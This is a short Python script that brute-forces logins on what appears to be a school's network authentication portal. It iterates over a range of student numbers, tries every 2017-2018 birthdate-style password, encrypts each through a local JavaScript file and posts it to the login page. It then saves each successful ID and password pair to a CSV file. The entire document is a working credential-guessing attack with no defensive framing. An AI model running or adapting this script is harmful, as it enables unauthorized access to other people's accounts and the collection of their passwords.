import requests
import execjs

client = requests.session()

url_open = 'http://192.168.1.3/'

url_close = 'http://192.168.1.3/F.htm'

htmljs = ''

for line in open('passwd.js','r'):
    htmljs+=line

ctx = execjs.compile(htmljs)

def passud(str):
    return ctx.call("school",str)

def write_msg(dd,mima):
    with open('xinxi.csv','a') as f:
        f.write("%s,%s\n"%(dd,mima))
        print("%s,%s--->写入成功"%(dd,mima))

for xuehao in range(2017000000,2018999999):
    for year in [2017,2018]:
        for yue in range(1,13):
            for day in range(1,32):
                mima = "%d%02d%02d"%(year,yue,day)
                data = {
                    'DDDDD': xuehao,
                    'upass': passud(mima),
                    'R1': 0,
                    'R2': 1,
                    'para': 00,
                    '0MKKey': 123456
                }
                while True:
                    try:
                        page = client.post(url=url_open,data=data)
                        break
                    except:
                        print('error')
                page.encoding = 'gbk'
                msg = page.text
                if msg.find('成功登录') !=-1:
                    write_msg(xuehao,mima)
                    client.get(url=url_close)